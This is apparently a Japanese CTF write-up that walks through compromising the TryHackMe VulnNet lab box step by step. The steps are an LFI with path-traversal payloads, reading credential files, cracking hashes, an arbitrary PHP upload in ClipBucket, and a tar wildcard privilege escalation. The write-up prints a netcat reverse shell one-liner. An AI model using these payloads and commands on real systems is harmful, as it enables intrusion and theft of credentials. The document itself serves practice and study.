# VulnNet CTF

https://tryhackme.com/room/vulnnet1

## Enumeration

```shell
TARGET=10.10.222.115
sudo bash -c "echo $TARGET   vulnnet.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

SSH, HTTPのみ。

### サブドメイン

```shell
$ ffuf -u http://vulnnet.thm -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.vulnnet.thm' -fs 5829

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.vulnnet.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5829
________________________________________________

broadcast               [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 261ms]
:: Progress: [4989/4989] :: Job [1/1] :: 138 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
```

broadcastサブドメインを発見。しかしログインが必要でなにも見られない。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://vulnnet.thm -w ./dirlist.txt -t 30 -k

===============================================================
/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]
/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/]
/img                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/img/]
/index.php            (Status: 200) [Size: 5829]
/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/]
/LICENSE.txt          (Status: 200) [Size: 1109]
Progress: 681570 / 681573 (100.00%)
===============================================================
```

LICENSE.txt は zlib.h のものだった。

メインページで読み込まれているjsが2つある。index.phpのGETパラメータに注目。

```js
n.p="http://vulnnet.thm/index.php?referer=",n(n.s=0)

return"".concat(void 0===e?"http://broadcast.vulnnet.thm":e).concat("/","?_alias=").concat(n,"&_callbackAlias=").concat(l,"&_lang=").concat(c)
```

http://vulnnet.thm/index.php?referer=index.php をリクエストすると返ってこなくなるので、何かありそうな予感はある。

http://vulnnet.thm/index.php?referer=LICENSE.txt をリクエストしても特に何もない。broadcastサブドメインのパスのファイルをinclude等しているのではないかと推測。

PHPファイルをファジングしたが、index.php 以外はヒットしなかった。

```sh
$ ffuf -u 'http://vulnnet.thm/index.php?referer=FUZZ.php' -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 5829

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm/index.php?referer=FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5829
________________________________________________

index                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 326ms]
:: Progress: [4744/4744] :: Job [1/1] :: 156 req/sec :: Duration: [0:00:40] :: Errors: 0 ::
```

txtファイルでファジングしたら、LICENSE.txtが検出された。どういうことか？

```sh
$ ffuf -u 'http://vulnnet.thm/index.php?referer=FUZZ.txt' -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 5829

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm/index.php?referer=FUZZ.txt
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5829
________________________________________________

LICENSE                 [Status: 200, Size: 6938, Words: 1896, Lines: 167, Duration: 255ms]
:: Progress: [4744/4744] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```

Web画面上には表示されないが、HTMLソースの中に展開されていた。つまり、broadcastサブドメインを参照しているわけではなく、同じディレクトリを参照していた。

```html
</div>

/* zlib.h -- interface of the 'zlib' general purpose compression library
  version 1.2.11, January 15th, 2017

  Copyright (C) 1995-2017 Jean-loup Gailly and Mark Adler

  This software is provided 'as-is', without any express or implied
  warranty.  In no event will the authors be held liable for any damages
  arising from the use of this software.

  Permission is granted to anyone to use this software for any purpose,
  including commercial applications, and to alter it and redistribute it
  freely, subject to the following restrictions:

  1. The origin of this software must not be misrepresented; you must not
     claim that you wrote the original software. If you use this software
     in a product, an acknowledgment in the product documentation would be
     appreciated but is not required.
  2. Altered source versions must be plainly marked as such, and must not be
     misrepresented as being the original software.
  3. This notice may not be removed or altered from any source distribution.

  Jean-loup Gailly        Mark Adler
  jloup@gzip.org          madler@alumni.caltech.edu

*/
	<script src="/js/index__7ed54732.js"></script>
	<script src="/js/index__d8338055.js"></script>
```

システムファイルをファジングしたら、かなり大量にヒットした。

```sh
$ ffuf -u 'http://vulnnet.thm/index.php?referer=FUZZ' -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 5829

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm/index.php?referer=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5829
________________________________________________

/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 2132ms]                                                                                
/etc/apache2/apache2.conf [Status: 200, Size: 13053, Words: 2630, Lines: 369, Duration: 254ms]
/etc/apt/sources.list   [Status: 200, Size: 8914, Words: 2004, Lines: 197, Duration: 253ms]
/etc/group              [Status: 200, Size: 6686, Words: 1689, Lines: 205, Duration: 252ms]
/etc/hosts.allow        [Status: 200, Size: 6240, Words: 1770, Lines: 152, Duration: 254ms]
/etc/hosts.deny         [Status: 200, Size: 6540, Words: 1816, Lines: 159, Duration: 316ms]
/etc/init.d/apache2     [Status: 200, Size: 14010, Words: 3188, Lines: 497, Duration: 254ms]
/etc/issue              [Status: 200, Size: 5853, Words: 1693, Lines: 144, Duration: 254ms]
/etc/mysql/my.cnf       [Status: 200, Size: 6511, Words: 1777, Lines: 163, Duration: 255ms]
/etc/nsswitch.conf      [Status: 200, Size: 6374, Words: 1821, Lines: 162, Duration: 253ms]
/./././././././././././etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 253ms]
/../../../../../../../../../../etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 252ms]
/etc/passwd             [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 253ms]
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 5178ms]
/etc/fstab              [Status: 200, Size: 6292, Words: 1756, Lines: 152, Duration: 2259ms]
/etc/crontab            [Status: 200, Size: 6592, Words: 1797, Lines: 158, Duration: 2295ms]
/etc/hosts              [Status: 200, Size: 6060, Words: 1708, Lines: 150, Duration: 1046ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 253ms]                    
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 253ms]                          
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 254ms]                                
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 253ms]                                      
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 253ms]                                            
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 254ms]                                                  
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 253ms]                                                        
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 253ms]                                                              
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 254ms]                                                                          
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 255ms]                                                                    
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 254ms]                                                                                
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 253ms]                                                                                      
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 254ms]                                                                                            
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 254ms]                                                                                                  
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 256ms]                                                                                                        
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 254ms]                                                                                                              
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 255ms]
....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 255ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 256ms]
....//....//....//etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 259ms]
/etc/resolv.conf        [Status: 200, Size: 6564, Words: 1785, Lines: 160, Duration: 266ms]
/etc/rpc                [Status: 200, Size: 6716, Words: 1724, Lines: 182, Duration: 265ms]
/etc/ssh/sshd_config    [Status: 200, Size: 9093, Words: 1982, Lines: 264, Duration: 262ms]
/etc/updatedb.conf      [Status: 200, Size: 6232, Words: 1730, Lines: 146, Duration: 266ms]
/proc/cpuinfo           [Status: 200, Size: 7957, Words: 1951, Lines: 198, Duration: 254ms]
/proc/loadavg           [Status: 200, Size: 5855, Words: 1693, Lines: 143, Duration: 251ms]
/proc/interrupts        [Status: 200, Size: 7634, Words: 2519, Lines: 175, Duration: 256ms]
/proc/mounts            [Status: 200, Size: 8360, Words: 1859, Lines: 176, Duration: 253ms]
/proc/meminfo           [Status: 200, Size: 7164, Words: 2180, Lines: 190, Duration: 256ms]
/proc/net/arp           [Status: 200, Size: 6062, Words: 1804, Lines: 145, Duration: 251ms]
/proc/net/dev           [Status: 200, Size: 6277, Words: 1929, Lines: 146, Duration: 254ms]
/proc/net/route         [Status: 200, Size: 6341, Words: 1978, Lines: 146, Duration: 255ms]
/proc/partitions        [Status: 200, Size: 5958, Words: 1734, Lines: 147, Duration: 254ms]
/proc/net/tcp           [Status: 200, Size: 6429, Words: 1910, Lines: 146, Duration: 256ms]
/proc/self/cmdline      [Status: 200, Size: 5856, Words: 1689, Lines: 142, Duration: 255ms]
/proc/version           [Status: 200, Size: 5982, Words: 1705, Lines: 143, Duration: 254ms]
/proc/self/status       [Status: 200, Size: 7124, Words: 1779, Lines: 196, Duration: 255ms]
/var/log/lastlog        [Status: 200, Size: 298121, Words: 1689, Lines: 142, Duration: 466ms]
/var/run/utmp           [Status: 200, Size: 7365, Words: 1689, Lines: 142, Duration: 253ms]
/var/www/html/.htaccess [Status: 200, Size: 10813, Words: 2044, Lines: 269, Duration: 256ms]
///////../../../etc/passwd [Status: 200, Size: 7660, Words: 1708, Lines: 175, Duration: 254ms]
:: Progress: [929/929] :: Job [1/1] :: 148 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

すばらしい。

```
$ curl http://vulnnet.thm/index.php?referer=/./././././././././././etc/passwd

...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```

root以外で、ログイン可能なユーザーはserver-managementのみ。  
/home/server-management/.ssh/id_rsa は取得できなかった。

base64フィルターを使って、index.php のソースを取得できた。
```sh
$ curl http://vulnnet.thm/index.php?referer=php://filter/convert.base64-encode/resource=index.php
```

index.php（抜粋）  
フィルターは、`../` を削除しているだけと判明。

```php
<?php
$file = $_GET['referer'];
$filter = str_replace('../','',$file);
include($filter);
?>
	<script src="/js/index__7ed54732.js"></script>
	<script src="/js/index__d8338055.js"></script>

</body>
</html>
```

サブドメインの設定を見つけた。

```xml
$ curl http://vulnnet.thm/index.php?referer=/etc/apache2/sites-available/000-default.conf

<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName vulnnet.thm
        DocumentRoot /var/www/main
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        <Directory /var/www/main>
                Order allow,deny
                allow from all
        </Directory>
</VirtualHost>

<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName broadcast.vulnnet.thm
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        <Directory /var/www/html>
                Order allow,deny
                allow from all
                AuthType Basic
                AuthName "Restricted Content"
                AuthUserFile /etc/apache2/.htpasswd
                Require valid-user
        </Directory>
</VirtualHost>
```

broadcast の index.php

```php
$ curl http://vulnnet.thm/index.php?referer=php://filter/convert.base64-encode/resource=....//html/index.php

<?php

	/**
	* File: Index
	* Description: This is home page of your wesbite. Anyone who lands on your website
	* using home page URL will see this page first
	* @author: Arslan Hassan
	* @since: 2007, ClipBucket v2.0
	* @website: clip-bucket.com
	* Copyright (c) 2007-2017 Clip-Bucket.com. All rights reserved
	* @modified : { January 10th, 2017 } { Saqib Razzaq } { Updated copyright date }
	*/

	define('THIS_PAGE','index');
	require 'includes/config.inc.php';
	$pages->page_redir();
	if(is_installed('editorspick')) {
		assign('editor_picks',get_ep_videos());
	}

	//Displaying The Template
	template_files('index.html');
	display_it();

?>
```

includes/config.inc.php 抜粋

```php
<?php
/*
Config.Inc.php
*/
define("FRONT_END",TRUE);
define("BACK_END",FALSE);

if(!defined('PARENT_PAGE'))
	define("PARENT_PAGE","home");
	


include('common.php');

include('plugins.php');		

...
```

dbconnect.php 抜粋（common.php でインクルードしていた）

```php
	$BDTYPE = 'mysql';
	//Database Host
	$DBHOST = '';
	//Database Name
	$DBNAME = 'VulnNet';
	//Database Username
	$DBUSER = 'admin';
	//Database Password
	$DBPASS = 'VulnNetAdminPass0990';
```

/etc/apache2/.htpasswd

broadcastサブドメインにアクセスするときのパスワードハッシュと思われる。

```
developers:[REDACTED]
```

rockyou.txt でクラックできた。broadcastサブドメインにログイン成功。

```sh
.\hashcat.exe -m 1600 hash.txt rockyou.txt
```

## ClipBucket

index.php のコメントを見ると、2017年1月に更新されたバージョンと思われる。
```
@modified : { January 10th, 2017 }
```

時期的に、下記のRCEが有効なのではないかと予想。  
https://www.exploit-db.com/exploits/42954

```sh
$ cp /usr/share/exploitdb/exploits/php/webapps/42954.py ./ 
```

しかし失敗。

```sh
$ python2 ./42954.py http://broadcast.vulnnet.thm/
$id
Sorry site is not vulnerable 
```

https://www.exploit-db.com/exploits/44250 のファイルアップロードを試す。

```
2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"
```

リバースシェルPHPをアップロード成功。

```sh
$ curl -u developers:[REDACTED] -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"

creating file{"success":"yes","file_name":"1752744878a26e62","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}   
```

http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1752744878a26e62.php にアクセスして、リバースシェル取得成功。

```sh
$ nc -lnvp 8888  
listening on [any] 8888 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.157.44] 55758
Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 11:36:11 up 3 min,  0 users,  load average: 0.06, 0.12, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格１

cronジョブ。rootが2分ごとに実行している。

```sh
www-data@vulnnet:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2   * * * *   root    /var/opt/backupsrv.sh
```

/home/server-management/Documents をバックアップしている。  
この時点でワイルドカードを使用していることにも気づいたが、まずはserver-managementへの昇格が必要。

```sh
www-data@vulnnet:/$ ls -al /var/opt/backupsrv.sh
-rwxr--r-- 1 root root 530 Jan 23  2021 /var/opt/backupsrv.sh
www-data@vulnnet:/$ cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

バックアップされたファイルを展開したら、id_rsaが出てきた。

```sh
www-data@vulnnet:/$ cp /var/backups/ssh-backup.tar.gz /tmp
www-data@vulnnet:/$ cd /tmp
www-data@vulnnet:/tmp$ tar -zxvf ./ssh-backup.tar.gz 
id_rsa
```

パスフレーズをクラックでき、server-management としてSSHログインできた。

```sh
$ ssh2john ./id_rsa > hash.txt

.\hashcat.exe -m 22931 hash.txt rockyou.txt
```

## 権限昇格２

cronジョブのもう一つの脆弱性。ワイルドカードの悪用。

```sh
server-management@vulnnet:~/Documents$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.85.243 8889 >/tmp/f" > shell.sh
server-management@vulnnet:~/Documents$ touch "/home/server-management/Documents/--checkpoint-action=exec=sh shell.sh"
server-management@vulnnet:~/Documents$ touch "/home/server-management/Documents/--checkpoint=1"

server-management@vulnnet:~/Documents$ ls -al
total 12
drwxr-xr-x  2 server-management server-management 4096 Jul 17 11:54  .
drwxrw---- 18 server-management server-management 4096 Jul 17 11:52  ..
-rw-rw-r--  1 server-management server-management    0 Jul 17 11:54 '--checkpoint=1'
-rw-rw-r--  1 server-management server-management    0 Jul 17 11:54 '--checkpoint-action=exec=sh shell.sh'
-rw-rw-r--  1 server-management server-management   80 Jul 17 11:54  shell.sh
```

rootシェル取得成功！

```sh
$ nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.157.44] 58400
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- GETパラメータはなかなかLFIと結び付けにくかった。
- `/etc/apache2/.htpasswd` は知らなかったので勉強になった。
- シェルを取った後の権限昇格は、知ってれば簡単。
